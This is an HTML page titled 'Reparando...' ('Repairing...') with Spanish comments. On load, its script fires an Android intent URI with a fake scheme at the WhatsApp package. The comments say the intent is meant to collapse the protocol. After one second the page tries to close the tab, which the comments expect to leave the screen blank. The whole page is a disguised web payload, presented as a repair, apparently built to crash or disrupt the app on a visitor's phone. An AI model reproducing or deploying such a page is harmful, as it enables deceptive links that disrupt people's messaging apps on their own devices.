<!DOCTYPE html>
<html>
<head>
    <title>Reparando...</title>
</head>
<body>
    <script>
        // Al cargar, lanza el intent que colapsa el protocolo
        window.location.href = "intent://#Intent;scheme=arcane_error;package=com.whatsapp;end";
        
        // Después de 1 segundo, intenta cerrar la pestaña (en móviles suele fallar y se queda en blanco)
        setTimeout(() => { window.close(); }, 1000);
    </script>
</body>
</html>
